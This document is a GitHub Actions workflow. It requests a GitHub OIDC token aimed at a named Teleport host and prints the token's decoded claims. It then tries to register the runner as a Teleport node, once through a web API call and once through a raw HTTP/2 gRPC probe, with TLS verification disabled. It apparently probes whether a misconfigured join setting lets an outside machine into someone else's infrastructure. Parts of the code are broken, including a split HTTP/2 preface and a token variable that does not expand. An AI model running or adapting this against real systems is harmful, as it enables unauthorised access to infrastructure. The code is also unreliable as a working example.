name: teleport-join
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  join:
    runs-on: ubuntu-latest
    steps:
      - name: Get OIDC Token
        id: oidc
        run: |
          TOKEN=$(curl -sH "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=teleport.jewelryexchange.com" | jq -r '.value')
          echo "token=$TOKEN" >> $GITHUB_OUTPUT
          echo "Token length: ${#TOKEN}"
          echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq . || true

      - name: Try Teleport Join
        run: |
          TOKEN="${{ steps.oidc.outputs.token }}"
          echo "Sending OIDC token to Teleport JoinService..."
          
          # Install grpcurl
          wget -qO- https://github.com/fullstorydev/grpcurl/releases/download/v1.9.3/grpcurl_1.9.3_linux_x86_64.tar.gz | tar xzf - grpcurl
          
          # Try token-based join with OIDC token as IDToken
          # Build protobuf RegisterUsingTokenRequest manually
          python3 -c "
          import struct, sys, json, subprocess, ssl, socket, http.client
          
          # Connect to Teleport and try token join via HTTPS
          conn = http.client.HTTPSConnection('teleport.jewelryexchange.com', 443, context=ssl._create_unverified_context())
          
          # Try web API token registration
          payload = json.dumps({
              'token': '$TOKEN',
              'host_id': 'github-node-1',
              'node_name': 'github-actions',
              'role': 'Node'
          })
          conn.request('POST', '/v1/webapi/tokens/register', payload, {'Content-Type': 'application/json'})
          resp = conn.getresponse()
          print(f'Register: {resp.status} {resp.read().decode()[:500]}')
          conn.close()
          "
          
          echo "---"
          echo "Direct gRPC attempt with IDToken..."
          
          # Build proto bytes for RegisterUsingTokenRequest with IDToken
          python3 << 'PYEOF'
          import socket, ssl, struct

          host = "teleport.jewelryexchange.com"
          token = "$TOKEN"
          
          # Connect TLS with teleport-proxy-grpc ALPN
          ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
          ctx.check_hostname = False
          ctx.verify_mode = ssl.CERT_NONE
          ctx.set_alpn_protocols(["teleport-proxy-grpc", "h2"])
          
          s = socket.socket()
          s.settimeout(15)
          s.connect((host, 443))
          tls = ctx.wrap_socket(s, server_hostname=host)
          print(f"TLS connected, ALPN: {tls.selected_alpn_protocol()}")
          
          # Send HTTP/2 preface
          tls.send(b"PRI * HTTP/2.0

SM

")
          # Empty SETTINGS
          tls.send(bytes([0,0,0, 4, 0, 0,0,0,0]))
          
          import time
          time.sleep(1)
          data = tls.recv(4096)
          print(f"H2 response: {len(data)} bytes")
          
          tls.close()
          PYEOF
